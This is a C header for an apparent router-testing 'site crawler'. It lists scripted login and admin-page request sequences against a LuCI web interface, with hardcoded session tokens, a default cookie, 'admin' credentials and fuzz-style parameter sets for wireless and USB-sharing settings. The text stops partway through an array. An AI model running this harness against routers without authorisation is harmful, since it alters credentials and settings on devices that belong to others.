/*
 * Copyright (c) 2018 [n/a] info@embeddora.com All rights reserved
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions are met:
 *        * Redistributions of source code must retain the above copyright
 *          notice, this list of conditions and the following disclaimer.
 *        * Redistributions in binary form must reproduce the above copyright
 *          notice, this list of conditions and the following disclaimer in the
 *          documentation and/or other materials provided with the distribution.
 *        * Neither the name of The Linux Foundation nor
 *          the names of its contributors may be used to endorse or promote
 *          products derived from this software without specific prior written
 *          permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
 * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND
 * NON-INFRINGEMENT ARE DISCLAIMED.    IN NO EVENT SHALL THE COPYRIGHT OWNER OR
 * CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,
 * PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS;
 * OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,
 * WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR
 * OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF
 * ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#ifndef _SITE_CRAWLER_H_
#define _SITE_CRAWLER_H_

#include <curl/curl.h>


/* Report #30, general success */
#define R30_SUCCESS		0

/* Report #30, general case failure */
#define R30_FAILURE		(-1)

/* Report #30, incorrecly composed opration array */
#define R30_EMPTY_OP		(-2)

/* Report #30, string length, single words: verbs and abbreviations */
#define R30_STRNLEN		80

/* Report #30, general purposed timeout; nice to have various waits for various site-operations */
#define R30_GP_TMO		2

/* Report #30, timeout for Tab2; nice to have nice to have various waits for various site-operations on Tab2 */
#define R30_TAB2_TMO		3

/* Report #30, timeout for Tab3; nice to have nice to have various waits for various site-operations on Tab3 */
#define R30_TAB3_TMO		3



/* Report #30, String tocken length; */
#define R30_TKN_LENGTH		32

/* String tocken wrapper length; same as strlen("stok="); */
#define R30_TKN_WRP_LENGTH	5



/* TODO: give a comment */
#define R30_PSW_LENGTH		256

/* TODO: give a comment */
#define R30_PSW_SP_LENGTH	6



/* Report #30, TODO string length */
#define R30_CKY_LENGTH		32

/* String tocken wrapper length; same as strlen("sysauth="); */
#define R30_WRP_CKY_LENGTH	8

/* Traffic disignator, should be unique among the existing User-Agents */
#define R30_CKY_MARKER		"MAZUKOWITZ-2450"




/* Max len of HTTP request */
#define R30_HTTP_LENGTH		0x200

/* Suppose 32K is enough to include any HTML responce from T5; used in <iRecvClbk()> */
#define R30_HTTP_CBK_BUF	0x400*32


/* Alternatively, use <node> */
#define INTERPRETER_FNAME	"nodejs"

/* Java script obtained via HTTP form P5 with minor custom amends */
#define RSA_COMPUTER_FNAME	"site_rsa.mri.js"

/* File lenth; let's have it exactly what it should be */
#define R30_RSA_LEN		0x100


/* File to catch computed RSA-value to */
#define ENCR_FNAME		"_delme.rsa"

/* File to store cookie(s) being found diring run*/
#define CKY_FNAME		"_delme.cky"

/* File to store tocken as is and wrapped one being found diring run */
#define TOKEN_FNAME		"_delme.tkn"

/* File to store passwords as they're been fond while diring run */
#define PASSWD_FNAME		"_delme.psw"

/* Max length of system commands we launch in external shell (bash, sh, ksh, usw) */
#define BASH_STRING_LEN		0x100


#if defined (RESPONCE_LATENCY_GAUGING)

/* File to store time elapsed between HTTP request and responce */
#define MRI_FNAME		"_delme.mri"

/* Max length of data we send to file and put to STDOUT while gauging the time between HTTP request and responce */
#define GAUGE_STRING_LEN	0x100

/* Amount of seconds after which a responce should be regarded as 'bug reproduce' delay */
#define GAUGE_HTTP_THRESHOLD	29500

#endif /* (RESPONCE_LATENCY_GAUGING) */


/* Report #30, set to 1 to explore traffic in hexadecimal view, keep as 0 in rest cases */
#define R30_DUMPING	0

/* Marker of command to open site */
#define OPEN_SITE	"open"

/* Marker of command to pass authentication */
#define AUTH		"auth"

/* Marker of command to switch to tab 1, same as passing authentication, see <auth>  */
#define TAB1		"tab1"

/* Marker of command to switch to tab 2 */
#define TAB2		"tab2"

/* Marker of command to switch to tab 3 */
#define TAB3		"tab3"


/* Default RSA key; used when it's impossible to compute the one in conventional way */
#define STUB0 "286d0d177bd567ba5db27bb709a0f041b9400dbc1961f47fff06f8cf10ea1325023fba8aa416049d9897d1dff49088f67347c825d495741563154d1b749466c939b1cf4bf7175d73e93554b359580c46be069e0c87d21a7d3fb356c7d39d8f3a2ea0507b5b21aefc08ad2ec9d39b4858845e0dfc44c5792ec66925772deb8d7c"

/* Default cookie; used when it's impossible to compute the one in conventional way */
#define CUKY0 "effbf71a985814ee44e1181771a8a5a8"


/* Amount of entries in complex type, entries of which are comples types, too */
#define ARRAY_SIZE(a) (sizeof(a) / sizeof(a[0]))


/* Structure to keep a HTTP-request pair: request itself and index to tell how the request has to be processeed */
typedef struct _GP 
{
	/* Index. 0 - GET, 1 - POST, the rest - 'ad-hoc' */
	int iGetOrPost;

	/* Request contents */
	char * pcAddrStr;

} Gp , *pGp, (*pGpSet)[];

/* String parameters */
typedef struct _SP 
{
	/* Contents of first parameter */
	char * pcStr1;

	/* Contents of second parameter */
	char * pcStr2;

	/* Contents of third parameter */
	char * pcStr3;

	/* Contents of fourth parameter */
	char * pcStr4;

} Sp, *pSp, (*pSpSet)[];


/* Type definition - records to contain URL sets and desired parameter sets */
typedef struct {
	/* Description of operation */
	const char *cName;

	/* A set of URLs to reproduce the operation */
	pGpSet apArr;

	/* A parameter(s) passed to operation, after tranform becomes a paramneter to sys.call/sys.fork */
	pSpSet apPar;

} ThreeDimSpace;



/* First step of 4-step Pattern. Initialized in main(). */
char str1[0x100], str2[0x100];

/* Secons step of 4-step Pattern. Initialized in main(). */
char str3[0x100], str4[0x100];

/* Third step of 4-step Pattern. Initialized in main(). */
char str5[0x100], str6[0x100];

/* Fourth step of 4-step Pattern. Initialized in main(). */
char str7[0x100], str8[0x100];



/* By this sequence we "open" website, so the certain calbacks on SRV side get prepared. Better name: aOpenSite_Array */
Gp aOpenArray[] = {

     { 0, "http://192.168.0.1/" },
     { 0, "http://192.168.0.1/webpages/login.html" },
     { 0, "http://192.168.0.1/webpages/css/widget.css" },
     { 0, "http://192.168.0.1/webpages/themes/green/css/style.css" },
     { 0, "http://192.168.0.1/webpages/js/libs/jquery.min.js" },
     { 0, "http://192.168.0.1/webpages/js/libs/jquery.nicescroll.min.js" },
     { 0, "http://192.168.0.1/webpages/js/su/locale.js" },
     { 0, "http://192.168.0.1/webpages/js/libs/encrypt.js" },
     { 0, "http://192.168.0.1/webpages/js/su/su.js" },
     { 0, "http://192.168.0.1/webpages/js/su/data/proxy.js" },
     { 0, "http://192.168.0.1/webpages/js/su/widget/widget.js" },
     { 0, "http://192.168.0.1/webpages/js/su/widget/window/msg.js" },
     { 0, "http://192.168.0.1/webpages/js/su/widget/form/form.js" },
     { 0, "http://192.168.0.1/webpages/js/su/widget/form/combobox.js" },
     { 0, "http://192.168.0.1/webpages/js/su/widget/form/textbox.js" },
     { 0, "http://192.168.0.1/webpages/js/su/widget/form/password.js" },
     { 0, "http://192.168.0.1/webpages/js/su/widget/form/checkbox.js" },
     { 0, "http://192.168.0.1/webpages/js/su/widget/form/button.js" },
     { 0, "http://192.168.0.1/webpages/js/su/widget/form/status.js" },
#if defined(EXTRA_PRECISION)
     { 0, "http://192.168.0.1/webpages/themes/green/img/icons.png"},
#endif /* (EXTRA_PRECISION) */
     { 1000, "http://192.168.0.1/cgi-bin/luci/;stok=/locale?form=lang" },
     { 0, "http://192.168.0.1/webpages/app.manifest" },
     { 0, "http://192.168.0.1/webpages/locale/en_US/lan.js?_=1481111286804" },
     { 0, "http://192.168.0.1/webpages/locale/en_US/lan.css" },
     { 0, "http://192.168.0.1/webpages/locale/en_US/help.js?_=1481111286805" },
     { 0, "http://192.168.0.1/webpages/locale/language.js?_=1481111286806" },
     { 0, "http://192.168.0.1/webpages/js/libs/encrypt.js" },
     { 1000, "http://192.168.0.1/cgi-bin/luci/;stok=/locale?form=list" },
     { 1000, "http://192.168.0.1/cgi-bin/luci/;stok=/login?form=cloud_login" },
     { 1000, "http://192.168.0.1/cgi-bin/luci/;stok=/login?form=login" },
     { 1000, "http://192.168.0.1/cgi-bin/luci/;stok=/login?form=initial_login" },
     { 1000, "http://192.168.0.1/cgi-bin/luci/;stok=/login?form=check_factory_default" },
     { 1000, "http://192.168.0.1/cgi-bin/luci/;stok=/domain_login?form=dlogin" },
#if defined(EXTRA_PRECISION)
     {0, "http://192.168.0.1/webpages/themes/green/img/icons2.png"},
#endif /* (EXTRA_PRECISION) */

     { 0, NULL }
};

/* A specific data for get some server's stuff we use as JavaScript-software source on client's side. Better name: aCodeExtruder_Array */
Gp aCodeExtruderArray[] = {

	/* To get RSA-computation JavaScript-code use following HTTP-request(s), after 'opening' the site */
	{ 0, "http://192.168.0.1/webpages/js/libs/encrypt.js"},
	{ 0, NULL  }

};

/* Better name: aAuth_Array */
Gp aAuthArray[]/* a.k.a. 'aTab1Array' */ = {

	{ 2, "http://192.168.0.1/cgi-bin/luci/;stok=/login?form=login"},
#if defined(EXTRA_PRECISION)
	{ 0, "http://192.168.0.1/webpages/themes/green/img/waiting.gif"},
#endif /* (EXTRA_PRECISION) */
	{ 0, "http://192.168.0.1/webpages/index.html"},
	{ 0, "http://192.168.0.1/webpages/css/widget.css"},
	{ 0, "http://192.168.0.1/webpages/js/libs/jquery.min.js"},
	{ 0, "http://192.168.0.1/webpages/themes/green/css/style.css"},
	{ 0, "http://192.168.0.1/webpages/js/libs/jquery.nicescroll.min.js"},
	{ 0, "http://192.168.0.1/webpages/js/su/su.js"},
	{ 0, "http://192.168.0.1/webpages/js/su/locale.js"},
	{ 0, "http://192.168.0.1/webpages/js/libs/encrypt.js"},
	{ 0, "http://192.168.0.1/webpages/js/su/data/proxy.js"},
	{ 0, "http://192.168.0.1/webpages/js/su/widget/widget.js"},
	{ 0, "http://192.168.0.1/webpages/js/su/widget/window/msg.js"},
	{ 0, "http://192.168.0.1/webpages/js/su/widget/form/form.js"},
	{ 0, "http://192.168.0.1/webpages/js/su/widget/form/combobox.js"},
	{ 0, "http://192.168.0.1/webpages/js/su/widget/form/checkbox.js"},
	{ 0, "http://192.168.0.1/webpages/js/su/widget/form/textbox.js"},
	{ 0, "http://192.168.0.1/webpages/js/su/widget/form/button.js"},
	{ 0, "http://192.168.0.1/webpages/js/su/widget/form/password.js"},
	{ 0, "http://192.168.0.1/webpages/js/su/widget/form/status.js"},
	{ 0, "http://192.168.0.1/webpages/js/libs/jquery.scrollTo.min.js"},
	{ 0, "http://192.168.0.1/webpages/js/su/data/store.js"},
	{ 0, "http://192.168.0.1/webpages/js/su/data/treestore.js"},
	{ 0, "http://192.168.0.1/webpages/js/su/widget/window/panel.js"},
	{ 0, "http://192.168.0.1/webpages/js/su/widget/window/page.js"},
	{ 0, "http://192.168.0.1/webpages/js/su/widget/window/wizard.js"},
	{ 0, "http://192.168.0.1/webpages/js/su/widget/window/foldertree.js"},
	{ 0, "http://192.168.0.1/webpages/js/su/widget/window/keyword.js"},
	{ 0, "http://192.168.0.1/webpages/js/su/widget/grid/grid.js"},
	{ 0, "http://192.168.0.1/webpages/js/su/widget/grid/editor.js"},
	{ 0, "http://192.168.0.1/webpages/js/su/widget/grid/paging.js"},
	{ 0, "http://192.168.0.1/webpages/js/su/widget/form/fieldset.js"},
	{ 0, "http://192.168.0.1/webpages/js/su/widget/form/radio.js"},
	{ 0, "http://192.168.0.1/webpages/js/su/widget/form/textarea.js"},
	{ 0, "http://192.168.0.1/webpages/js/su/widget/form/time.js"},
	{ 0, "http://192.168.0.1/webpages/js/su/widget/form/file.js"},
	{ 0, "http://192.168.0.1/webpages/js/su/widget/form/timepicker.js"},
	{ 0, "http://192.168.0.1/webpages/js/su/widget/form/progressbar.js"},
	{ 0, "http://192.168.0.1/webpages/js/su/widget/form/slider.js"},
	{ 0, "http://192.168.0.1/webpages/js/su/widget/form/switch.js"},
	{ 666/*1000*/, "http://192.168.0.1/cgi-bin/luci/;stok=/locale?form=lang"},
#if defined(EXTRA_PRECISION)
	{ 0, "http://192.168.0.1/webpages/themes/green/img/loading.gif"},
	{ 0, "http://192.168.0.1/webpages/themes/green/img/icons2.png"},
	{ 0, "http://192.168.0.1/webpages/themes/green/img/icons.png"},
#endif /* (EXTRA_PRECISION) */
	{ 0, "http://192.168.0.1/webpages/locale/de_DE/lan.js?_=1482736660345"},
	{ 0, "http://192.168.0.1/webpages/locale/de_DE/lan.css"},
	{ 0, "http://192.168.0.1/webpages/locale/de_DE/help.js?_=1482736660346"},
	{ 0, "http://192.168.0.1/webpages/locale/language.js?_=1482736660347"},
	{ 1, "http://192.168.0.1/webpages/pages/userrpm/userFeedBack.html"},
	{ 1000, "http://192.168.0.1/cgi-bin/luci/;stok=6c2a1ef44697a73379a350deec6601a0/locale?form=list"},
	{ 1000, "http://192.168.0.1/cgi-bin/luci/;stok=6c2a1ef44697a73379a350deec6601a0/admin/ledgeneral?form=setting"},
	{ 1000, "http://192.168.0.1/cgi-bin/luci/;stok=6c2a1ef44697a73379a350deec6601a0/admin/cloud_account?form=check_login"},
	{ 1000, "http://192.168.0.1/cgi-bin/luci/;stok=6c2a1ef44697a73379a350deec6601a0/admin/system?form=sysmode"},
	{ 1000, "http://192.168.0.1/cgi-bin/luci/;stok=6c2a1ef44697a73379a350deec6601a0/admin/cloud_account?form=check_support"},
	{ 0, "http://192.168.0.1/webpages/data/region.json?operation=read&_=1482736660348"},
	{ 1000, "http://192.168.0.1/cgi-bin/luci/;stok=6c2a1ef44697a73379a350deec6601a0/admin/feedback?form=content"},
	{ 1000, "http://192.168.0.1/cgi-bin/luci/;stok=6c2a1ef44697a73379a350deec6601a0/admin/cloud_account?form=check_cloud_version"},
	{ 1000, "http://192.168.0.1/cgi-bin/luci/;stok=6c2a1ef44697a73379a350deec6601a0/admin/cloud_account?form=check_upgrade"},
	{ 1000, "http://192.168.0.1/cgi-bin/luci/;stok=6c2a1ef44697a73379a350deec6601a0/admin/firmware?form=upgrade"},
	{ 1, "http://192.168.0.1/webpages/pages/frame/quick-setup.html"},
	{ 1000, "http://192.168.0.1/cgi-bin/luci/;stok=6c2a1ef44697a73379a350deec6601a0/admin/administration?form=account"},
	{ 0, "http://192.168.0.1/webpages/locale/ru_RU/ispAutoConf.js?_=1482736660349"},
	{ 1000, "http://192.168.0.1/cgi-bin/luci/;stok=6c2a1ef44697a73379a350deec6601a0/locale?form=country"},
	{ 1000, "http://192.168.0.1/cgi-bin/luci/;stok=6c2a1ef44697a73379a350deec6601a0/admin/cloud_account?form=user_login"},
	{ 1000, "http://192.168.0.1/cgi-bin/luci/;stok=6c2a1ef44697a73379a350deec6601a0/locale?form=country_list"},
	{ 1000, "http://192.168.0.1/cgi-bin/luci/;stok=6c2a1ef44697a73379a350deec6601a0/admin/quick_setup?form=timezone"},
	{ 1000, "http://192.168.0.1/cgi-bin/luci/;stok=6c2a1ef44697a73379a350deec6601a0/admin/network?form=status_ipv4"},
	{ 1000, "http://192.168.0.1/cgi-bin/luci/;stok=6c2a1ef44697a73379a350deec6601a0/admin/quick_setup?form=quick_setup"},

	{ 0x0, NULL }
};

/* Better name: aCloseSite_Array */
Gp aExitArray[] = {

	{ 1006, "http://192.168.0.1/cgi-bin/luci/;stok=b2c63d5a14d0699b233094bae241cc89/admin/system?form=logout"},
	{ 0, "http://192.168.0.1/"},
	{ 0, "http://192.168.0.1/webpages/login.html"},
	{ 0, "http://192.168.0.1/webpages/css/widget.css"},
	{ 0, "http://192.168.0.1/webpages/themes/green/css/style.css"},
	{ 0, "http://192.168.0.1/webpages/js/libs/jquery.nicescroll.min.js"},
	{ 0, "http://192.168.0.1/webpages/js/libs/jquery.min.js"},
	{ 0, "http://192.168.0.1/webpages/js/su/locale.js"},
	{ 0, "http://192.168.0.1/webpages/js/libs/encrypt.js"},
	{ 0, "http://192.168.0.1/webpages/js/su/su.js"},
	{ 0, "http://192.168.0.1/webpages/js/su/data/proxy.js"},
	{ 0, "http://192.168.0.1/webpages/js/su/widget/widget.js"},
	{ 0, "http://192.168.0.1/webpages/js/su/widget/window/msg.js"},
	{ 0, "http://192.168.0.1/webpages/js/su/widget/form/form.js"},
	{ 0, "http://192.168.0.1/webpages/js/su/widget/form/combobox.js"},
	{ 0, "http://192.168.0.1/webpages/js/su/widget/form/textbox.js"},
	{ 0, "http://192.168.0.1/webpages/js/su/widget/form/password.js"},
	{ 0, "http://192.168.0.1/webpages/js/su/widget/form/checkbox.js"},
	{ 0, "http://192.168.0.1/webpages/js/su/widget/form/button.js"},
	{ 0, "http://192.168.0.1/webpages/js/su/widget/form/status.js"},
#if defined(EXTRA_PRECISION)
	{ 0, "http://192.168.0.1/webpages/themes/green/img/icons.png"},
#endif /* (EXTRA_PRECISION) */
	{ 1000, "http://192.168.0.1/cgi-bin/luci/;stok=/locale?form=lang"},
	{ 0, "http://192.168.0.1/webpages/locale/de_DE/lan.js?_=1482885989441"},
	{ 0, "http://192.168.0.1/webpages/locale/de_DE/lan.css"},
	{ 0, "http://192.168.0.1/webpages/locale/de_DE/help.js?_=1482885989442"},
	{ 0, "http://192.168.0.1/webpages/locale/language.js?_=1482885989443"},
	{ 0, "http://192.168.0.1/webpages/js/libs/encrypt.js"},
#if defined(EXTRA_PRECISION)
	{ 0, "http://192.168.0.1/webpages/themes/green/img/icons2.png"},
#endif /* (EXTRA_PRECISION) */

	{ 0x0, NULL }
};

/* 0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF */

/* Advanced. USB-share. Username & password */
Gp a9_URLs[] = {

	/* Tab-3 */
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=f1722c603ee0b66edd836bf1a8aaab3b/admin/quick_setup?form=quick_setup"},
	{ 1, "http://192.168.0.1/webpages/pages/frame/advanced.html"},
	{ 0, "http://192.168.0.1/cgi-bin/luci/;stok=f1722c603ee0b66edd836bf1a8aaab3b/admin/menu?form=advanced_menu"},
	{ 1, "http://192.168.0.1/webpages/pages/userrpm/status.html"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=f1722c603ee0b66edd836bf1a8aaab3b/admin/wireless?form=region"},

	/* USB-Sharing Group */
	{ 1, "http://192.168.0.1/webpages/pages/userrpm/folderSharing.html"},
	{ 0, "http://192.168.0.1/webpages/js/libs/excanvas.js?_=1494212447472"},
	{ 0, "http://192.168.0.1/webpages/js/libs/Chart.js?_=1494212447473"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=f1722c603ee0b66edd836bf1a8aaab3b/admin/disk_setting?form=first"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=f1722c603ee0b66edd836bf1a8aaab3b/admin/disk_setting?form=metadata"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=f1722c603ee0b66edd836bf1a8aaab3b/admin/folder_sharing?form=settings"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=f1722c603ee0b66edd836bf1a8aaab3b/admin/folder_sharing?form=server"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=f1722c603ee0b66edd836bf1a8aaab3b/admin/folder_sharing?form=auth"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=f1722c603ee0b66edd836bf1a8aaab3b/admin/folder_sharing?form=partial"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=f1722c603ee0b66edd836bf1a8aaab3b/admin/folder_sharing?form=guest"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=f1722c603ee0b66edd836bf1a8aaab3b/admin/folder_sharing?form=media"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=f1722c603ee0b66edd836bf1a8aaab3b/admin/disk_setting?form=contents&serial=0320815020006996"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=f1722c603ee0b66edd836bf1a8aaab3b/admin/folder_sharing?form=volumn"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=f1722c603ee0b66edd836bf1a8aaab3b/admin/folder_sharing?form=tree"},

	/* USB-Storage Device Applet */
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=f1722c603ee0b66edd836bf1a8aaab3b/admin/folder_sharing?form=mode"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=f1722c603ee0b66edd836bf1a8aaab3b/admin/disk_setting?form=first"},
	{ 1, "http://192.168.0.1/webpages/pages/userrpm/folderSharing.html"},
	{ 0, "http://192.168.0.1/webpages/js/libs/excanvas.js?_=1494212447474"},
	{ 0, "http://192.168.0.1/webpages/js/libs/Chart.js?_=1494212447475"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=f1722c603ee0b66edd836bf1a8aaab3b/admin/disk_setting?form=first"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=f1722c603ee0b66edd836bf1a8aaab3b/admin/disk_setting?form=metadata"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=f1722c603ee0b66edd836bf1a8aaab3b/admin/folder_sharing?form=settings"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=f1722c603ee0b66edd836bf1a8aaab3b/admin/folder_sharing?form=server"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=f1722c603ee0b66edd836bf1a8aaab3b/admin/folder_sharing?form=auth"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=f1722c603ee0b66edd836bf1a8aaab3b/admin/folder_sharing?form=partial"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=f1722c603ee0b66edd836bf1a8aaab3b/admin/folder_sharing?form=guest"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=f1722c603ee0b66edd836bf1a8aaab3b/admin/folder_sharing?form=media"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=f1722c603ee0b66edd836bf1a8aaab3b/admin/disk_setting?form=contents&serial=0320815020006996"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=f1722c603ee0b66edd836bf1a8aaab3b/admin/folder_sharing?form=volumn"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=f1722c603ee0b66edd836bf1a8aaab3b/admin/folder_sharing?form=tree"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=f1722c603ee0b66edd836bf1a8aaab3b/admin/folder_sharing?form=mode"},

	/* Assignment itself */
	{ 311, "http://192.168.0.1/cgi-bin/luci/;stok=f1722c603ee0b66edd836bf1a8aaab3b/admin/folder_sharing?form=partial"},

	/* End of roulette marker */
	{ 0x0, NULL }
};

/* Attention: execrising this alters SFTP access credentials */
Sp a9_Params[] = {

	/* A quartet of correct values to ensure engine works: {"admin", "admin", "adminD", "adminD"},	 */

	/* PATTERN3 - STEP1 */
	{"admin", "admin", str1, str2},

	/* PATTERN3 - STEP1 */
	{"admin", "admin", str3, str4},

	/* PATTERN3 - STEP1 */
	{"admin", "admin", str5, str6},

	/* PATTERN3 - STEP1 */
	{"admin", "admin", str7, str8},

	/* Terminating record */
	{NULL, NULL, NULL, NULL}

};


/* Advanced. Wireless. SessionID1 , SessionID2 */
Gp a7_Array[] = {

	/* Tab-3 */
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=f1722c603ee0b66edd836bf1a8aaab3b/admin/quick_setup?form=quick_setup"},
	{ 1, "http://192.168.0.1/webpages/pages/frame/advanced.html"},
	{ 0, "http://192.168.0.1/cgi-bin/luci/;stok=f1722c603ee0b66edd836bf1a8aaab3b/admin/menu?form=advanced_menu"},
	{ 1, "http://192.168.0.1/webpages/pages/userrpm/status.html"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=f1722c603ee0b66edd836bf1a8aaab3b/admin/wireless?form=region"},

	/* Wireless Group */
	{ 1, "http://192.168.0.1/webpages/pages/userrpm/guestSettings.html"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=c1f8f8c3f6ca0f61ba7686d77cd2d547/admin/wireless?form=guest"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=c1f8f8c3f6ca0f61ba7686d77cd2d547/admin/wireless?form=region"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=c1f8f8c3f6ca0f61ba7686d77cd2d547/admin/wireless?form=guest_2g&form=guest_5g&form=guest_2g5g"},

	/* Setting itself */
	{ 312, "http://192.168.0.1/cgi-bin/luci/;stok=c1f8f8c3f6ca0f61ba7686d77cd2d547/admin/wireless?form=guest_2g&form=guest_5g&form=guest_2g5g"},

	/* End of array marker */
	{ 0x0, NULL }
};

/* Attention: of limited size, does not accept long records */
Sp a7_Params[] = {

	/* A pair of correct values to ensure engine works */
	//{"STRING1_STRING1_STRING1", "STRING2_STRING2_STRING2", NULL, NULL},

	/* PATTERN1 - no success */
	{str3, str4, NULL, NULL},

	/* Terminating record */
	{NULL, NULL, NULL, NULL}
};

/* Advanced. Wireless. 2.4 GHz */
Gp a6_URLs[] = {

	/* Tab-3 */
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=f1722c603ee0b66edd836bf1a8aaab3b/admin/quick_setup?form=quick_setup"},
	{ 1, "http://192.168.0.1/webpages/pages/frame/advanced.html"},
	{ 0, "http://192.168.0.1/cgi-bin/luci/;stok=f1722c603ee0b66edd836bf1a8aaab3b/admin/menu?form=advanced_menu"},
	{ 1, "http://192.168.0.1/webpages/pages/userrpm/status.html"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=f1722c603ee0b66edd836bf1a8aaab3b/admin/wireless?form=region"},

	/* Wireless Group, 2.4 */
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=9b9dda8ae5874d60056215425a564f97/admin/status?form=all"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=9b9dda8ae5874d60056215425a564f97/admin/wireless?form=wireless_schedule_wifi_disable"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=9b9dda8ae5874d60056215425a564f97/admin/status?form=all"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=9b9dda8ae5874d60056215425a564f97/admin/status?form=internet"},
	{ 1, "http://192.168.0.1/webpages/pages/userrpm/wirelessSettings.html"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=9b9dda8ae5874d60056215425a564f97/admin/network?form=lan_ipv4"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=9b9dda8ae5874d60056215425a564f97/admin/region?form=region"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=9b9dda8ae5874d60056215425a564f97/locale?form=country_list"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=9b9dda8ae5874d60056215425a564f97/admin/wireless?form=region"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=9b9dda8ae5874d60056215425a564f97/locale?form=country"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=9b9dda8ae5874d60056215425a564f97/admin/wireless?form=wireless_2g"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=9b9dda8ae5874d60056215425a564f97/admin/wireless?form=wireless_5g"},

	/* Setting itself */
	{ 313, "http://192.168.0.1/cgi-bin/luci/;stok=9b9dda8ae5874d60056215425a564f97/admin/wireless?form=wireless_2g"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=9b9dda8ae5874d60056215425a564f97/admin/wireless?form=syspara_2g"},

	/* End marker */
	{ 0x0, NULL }
};

/* Attention: of limited size, does not accept long records */
Sp a6_Params[] = {

	/* A pair of correct values to ensure engine works */
	//{"STRING1_STRING1_STRING1", "STRING2_STRING2_STRING2", NULL, NULL},

	/* PATTERN1 - no success */
	{str3, str4, NULL, NULL},
	

	/* Terminating record */
	{NULL, NULL, NULL, NULL}

};


/* Advanced. Wireless. 5. GHz */
Gp a5_URLs[] = {

	/* Tab-3 */
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=f1722c603ee0b66edd836bf1a8aaab3b/admin/quick_setup?form=quick_setup"},
	{ 1, "http://192.168.0.1/webpages/pages/frame/advanced.html"},
	{ 0, "http://192.168.0.1/cgi-bin/luci/;stok=f1722c603ee0b66edd836bf1a8aaab3b/admin/menu?form=advanced_menu"},
	{ 1, "http://192.168.0.1/webpages/pages/userrpm/status.html"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=f1722c603ee0b66edd836bf1a8aaab3b/admin/wireless?form=region"},

	/* Wireless tab, 5 */
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=9b9dda8ae5874d60056215425a564f97/admin/status?form=all"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=9b9dda8ae5874d60056215425a564f97/admin/wireless?form=wireless_schedule_wifi_disable"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=9b9dda8ae5874d60056215425a564f97/admin/status?form=all"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=9b9dda8ae5874d60056215425a564f97/admin/status?form=internet"},
	{ 1, "http://192.168.0.1/webpages/pages/userrpm/wirelessSettings.html"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=9b9dda8ae5874d60056215425a564f97/admin/network?form=lan_ipv4"},
